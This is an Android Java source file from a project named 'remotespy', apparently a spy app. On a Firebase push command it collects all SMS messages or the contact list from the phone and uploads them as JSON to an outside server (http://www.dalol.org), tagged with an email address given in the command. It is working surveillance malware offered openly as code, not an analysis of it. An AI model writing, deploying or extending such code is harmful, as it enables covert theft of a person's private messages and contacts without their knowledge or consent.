package org.dalol.remotespy;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.media.RingtoneManager;
import android.net.Uri;
import android.support.v4.app.NotificationCompat;
import android.widget.Toast;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.google.gson.Gson;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

/**
 * Created by filippo on 01/03/2018.
 */

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        // Create and show notification
        RemoteMessage.Notification notification = remoteMessage.getNotification();
        if (notification != null) {
            //msg, all-sms, filippo.eng@gmail.com
            String body = notification.getBody();
            if (body != null) {
                if (body.length() > 2) {
                    String[] split = body.split(",");
                    if("msg".equals(split[0])) {
                        ArrayList<Sms> allSms = new MessagesHelper().getAllSms(this);
                        sendToServer(allSms, split[1],  split[2]);
                    } else {
                        List<ContacT> contacTS = new MessagesHelper().fetchContacts(this);
                        sendToServer(contacTS, split[1],  split[2]);
                    }
                }
            }
        }

        //sendNotification(body);




        //System.out.println();
    }

    private void sendToServer(Object o, String subject , String email) {
        try{
            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("http://www.dalol.org")
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();

            CollectApi collectApi = retrofit.create(CollectApi.class);
            Call<ApiResponse> call = collectApi.sendData(email, subject, new Gson().toJson(o));
            call.enqueue(new Callback<ApiResponse>() {
                @Override
                public void onResponse(Call<ApiResponse> call, Response<ApiResponse> response) {
                    if (response.isSuccessful()) {
                        ApiResponse apiResponse = response.body();
                        if (apiResponse != null) {
                            Toast.makeText(MyFirebaseMessagingService.this, apiResponse.getMessage(), Toast.LENGTH_SHORT).show();
                        } else {
                            Toast.makeText(MyFirebaseMessagingService.this, response.message(), Toast.LENGTH_SHORT).show();
                        }
                    } else {
                        Toast.makeText(MyFirebaseMessagingService.this, response.message(), Toast.LENGTH_SHORT).show();
                    }
                }

                @Override
                public void onFailure(Call<ApiResponse> call, Throwable t) {
                    Toast.makeText(MyFirebaseMessagingService.this, t.getMessage(), Toast.LENGTH_SHORT).show();
                }
            });

        } catch(Exception e){
            System.err.println(e.getMessage());
        }
    }

    private void sendNotification(String messageBody) {
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0 /* Request code */, intent,
                PendingIntent.FLAG_ONE_SHOT);

        Uri defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle("FCM Message")
                .setContentText(messageBody)
                .setAutoCancel(true)
                .setSound(defaultSoundUri)
                .setContentIntent(pendingIntent);

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        notificationManager.notify(0 /* ID of notification */, notificationBuilder.build());
    }
}